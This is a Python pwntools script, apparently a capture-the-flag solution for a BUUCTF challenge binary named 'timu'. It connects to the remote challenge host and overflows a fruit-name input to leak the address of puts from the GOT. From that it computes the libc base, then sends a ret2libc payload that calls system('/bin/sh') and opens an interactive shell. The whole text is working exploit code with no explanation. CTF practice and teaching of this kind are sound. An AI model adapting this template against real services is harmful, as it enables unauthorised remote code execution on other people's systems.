from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",26772)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main=0x080486F4

sh.sendline(b"5")
sh.recvuntil(b"Please input the name of fruit:")
payload=0xa4*b'a'+b'aaaa'+p32(puts_plt)+p32(main)+p32(puts_got)
sh.sendline(payload)
sh.recvuntil(b"\n")
puts_addr=u32(sh.recv(4))

libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh\x00"))

sh.sendline(b"5")
sh.recvuntil(b"Please input the name of fruit:")
payload=0xa4*b'a'+b'aaaa'+p32(system_addr)+p32(main)+p32(binsh)
sh.sendline(payload)

sh.interactive()
